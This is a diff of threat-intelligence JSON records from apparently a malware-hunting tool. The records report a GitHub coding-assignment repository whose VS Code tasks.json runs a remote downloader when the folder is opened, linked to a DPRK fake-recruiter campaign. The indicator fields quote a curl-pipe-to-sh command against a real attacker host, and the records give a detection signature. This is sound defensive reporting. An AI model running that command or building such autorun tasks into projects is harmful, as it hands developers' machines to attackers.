@@ -19,10 +19,10 @@
     "iocs": "vscode-extensions-bootstrap.vercel.app; https://vscode-extensions-bootstrap.vercel.app/settings/mac?flag=302; https://vscode-extensions-bootstrap.vercel.app/settings/linux?flag=302; curl 'https://vscode-extensions-bootstrap.vercel.app/settings/mac?flag=302' | sh; .vscode/tasks.json",
     "matched_signatures": "folderOpen curl filename:tasks.json",
     "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 8)",
-    "osm_status": "submitted",
-    "osm_threat_id": "cd1fd941-86a6-46bb-866f-b769efa33beb",
-    "first_seen": "hunt-20260925T173032Z",
-    "last_seen": "hunt-20260925T173032Z",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20260923T001603Z",
+    "last_seen": "hunt-20260923T001603Z",
     "evidence_file": "repositories/juanmantica123_funtico-tech-assestment.json",
     "reviewer_decision": "",
     "notes": ""
@@ -118,7 +118,7 @@
     "report_type": "repository",
     "resource_identifier": "https://github.com/juanmantica123/funtico-tech-assestment",
     "version_info": "all",
-    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from vscode-extensions-bootstrap.vercel.app and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: vscode-extensions-bootstrap.vercel.app.\nCampaign GW-C-498a0aeb: one of 86 confirmed repos across 58 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 18 distinct hosts, including 260120.vercel.app, default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: vscode-extensions-bootstrap.vercel.app.\nFound by GitHub code search for a confirmed malware signature: folderOpen curl filename:tasks.json.\nConfirmed by static analysis; the code was read, never executed.",
+    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from vscode-extensions-bootstrap.vercel.app and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: vscode-extensions-bootstrap.vercel.app.\nCampaign GW-C-498a0aeb: one of 81 confirmed repos across 69 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 18 distinct hosts, including default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app, vscode-config-settings.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: vscode-extensions-bootstrap.vercel.app.\nFound by GitHub code search for a confirmed malware signature: folderOpen curl filename:tasks.json.\nConfirmed by static analysis; the code was read, never executed.",
     "payload_description": "Malicious payload found in: .vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from vscode-extensions-bootstrap.vercel.app and executes it (.vscode/tasks.json).\n- .vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed\n- Attacker hosts: vscode-extensions-bootstrap.vercel.app",
     "publisher": "juanmantica123",
     "severity_level": "critical",
@@ -136,7 +136,7 @@
     "evidence_references": "https://github.com/juanmantica123/funtico-tech-assestment/blob/2e21f21d6c25933ef0076a65a0dfc7e01505c4f5/.vscode/tasks.json\nhttps://github.com/juanmantica123/funtico-tech-assestment/blob/2e21f21d6c25933ef0076a65a0dfc7e01505c4f5/server/controllers/users.controller.js#L8\nhttps://github.com/juanmantica123/funtico-tech-assestment/blob/2e21f21d6c25933ef0076a65a0dfc7e01505c4f5/server/controllers/property.controller.js#L70\nhttps://github.com/juanmantica123/funtico-tech-assestment/blob/2e21f21d6c25933ef0076a65a0dfc7e01505c4f5/server/controllers/property.controller.js#L102\nhttps://github.com/juanmantica123/funtico-tech-assestment/blob/2e21f21d6c25933ef0076a65a0dfc7e01505c4f5/server/controllers/property.controller.js#L140\nhttps://github.com/juanmantica123/funtico-tech-assestment/blob/2e21f21d6c25933ef0076a65a0dfc7e01505c4f5/server/controllers/common.controller.js#L9\nhttps://github.com/juanmantica123/funtico-tech-assestment/blob/2e21f21d6c25933ef0076a65a0dfc7e01505c4f5/server/controllers/common.controller.js#L30\nhttps://github.com/juanmantica123/funtico-tech-assestment/blob/2e21f21d6c25933ef0076a65a0dfc7e01505c4f5/server/controllers/common.controller.js#L40\nhttps://github.com/juanmantica123/funtico-tech-assestment/blob/2e21f21d6c25933ef0076a65a0dfc7e01505c4f5/server/controllers/auth.controller.js#L15\nhttps://github.com/juanmantica123/funtico-tech-assestment/blob/2e21f21d6c25933ef0076a65a0dfc7e01505c4f5/server/controllers/auth.controller.js#L87\nhttps://github.com/juanmantica123/funtico-tech-assestment/blob/2e21f21d6c25933ef0076a65a0dfc7e01505c4f5/server/controllers/auth.controller.js#L97",
     "verified_iocs": "vscode-extensions-bootstrap.vercel.app\nhttps://vscode-extensions-bootstrap.vercel.app/settings/mac?flag=302\nhttps://vscode-extensions-bootstrap.vercel.app/settings/linux?flag=302\ncurl 'https://vscode-extensions-bootstrap.vercel.app/settings/mac?flag=302' | sh\n.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-09-25T17:30:32Z",
-    "last_seen": "2026-09-25T17:30:32Z"
+    "first_seen": "2026-09-23T00:16:03Z",
+    "last_seen": "2026-09-23T00:16:03Z"
   }
 }
